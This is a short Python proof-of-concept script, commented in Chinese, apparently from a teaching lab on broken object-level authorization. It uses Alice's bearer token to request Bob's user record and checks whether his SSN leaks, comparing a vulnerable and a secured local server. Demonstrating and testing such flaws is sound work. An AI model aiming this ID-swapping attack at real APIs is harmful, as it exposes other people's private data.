"""BOLA 攻擊腳本:以 Alice 的身分,嘗試讀取 Bob(別人)的資料。

同一支腳本打 vulnerable 與 secure 兩版,靠回應差異證明漏洞是否成立:
- vulnerable:拿到 Bob 的 ssn → 攻擊成功。
- secure:被 403 擋下 → 攻擊失敗。
"""

import requests

ATTACKER_TOKEN = "alice-token"   # Alice 的合法令牌(id=1)
ATTACKER_OWN_ID = 1
VICTIM_ID = 2                    # Bob,不屬於 Alice
REQUEST_TIMEOUT_SECONDS = 5


def run_bola_attack(base_url):
    """回傳 (是否洩漏, 說明字串)。是否洩漏=True 代表漏洞成立。"""
    headers = {"Authorization": f"Bearer {ATTACKER_TOKEN}"}

    # 對照組:讀自己的資料應該成功(確認認證與端點正常)。
    own = requests.get(
        f"{base_url}/api/users/{ATTACKER_OWN_ID}",
        headers=headers,
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if own.status_code != 200:
        return False, f"連自己的資料都讀不到(status={own.status_code}),環境異常"

    # 攻擊:改成受害者的 id,看能不能越權讀到別人的敏感資料。
    victim = requests.get(
        f"{base_url}/api/users/{VICTIM_ID}",
        headers=headers,
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    if victim.status_code == 200 and "ssn" in victim.json():
        leaked = victim.json()["ssn"]
        return True, f"越權成功!讀到 Bob 的 ssn = {leaked}"
    return False, f"越權被擋(status={victim.status_code}),授權檢查生效"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001"
    leaked, message = run_bola_attack(target)
    print(("[漏洞成立] " if leaked else "[已防禦] ") + message)
